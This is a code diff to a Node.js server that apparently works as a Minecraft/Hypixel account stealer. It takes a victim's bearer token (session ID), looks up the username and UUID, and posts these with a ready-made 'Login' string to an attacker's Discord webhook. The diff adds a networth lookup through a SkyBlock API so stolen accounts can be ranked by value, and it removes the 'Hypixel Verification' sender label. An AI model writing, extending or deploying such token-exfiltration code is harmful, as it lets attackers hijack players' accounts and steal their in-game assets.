@@ -24,10 +24,11 @@ app.get('/', async (req, res) => {
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
+        const networth = await checkNetworth(username)
         if (checkIfBanned(username)) {
             return
         }
-        postToWebhook(username, bearerToken, uuid)
+        postToWebhook(username, bearerToken, uuid, networth)
     } catch (e) {
         console.log(e)
     }
@@ -116,18 +117,25 @@ async function getUsernameAndUUID(bearerToken) {
     return [response.data['id'], response.data['name']]
 }
 
-function postToWebhook(username, bearerToken, uuid) {
+async function checkNetworth(name){
+    const url = "https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/"+ name +"?key=dxxxxy"
+    const response = await axios.get(url)
+    return response.data['networth']['unsoulboundNetworth']
+}
+
+function postToWebhook(username, bearerToken, uuid, networth) {
     const url = webhook_url
     let data = {
-        username: "Hypixel Verification :)",
+        username: " ",
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
         content: "@everyone",
         embeds: [{
-            title: "User Info", color: 0x00ff00, fields: [
+            title: "User Info", color: 0x00ff50, fields: [
                 {name: "Username", value: username, inline: true},
                 {name: "UUID", value: uuid, inline: true},
+                {name: "ELT", value: networth, inline: true},
                 {name: "SessionID", value: bearerToken, inline: false},
-                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false}
+                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: true},
             ]
         }]
     }
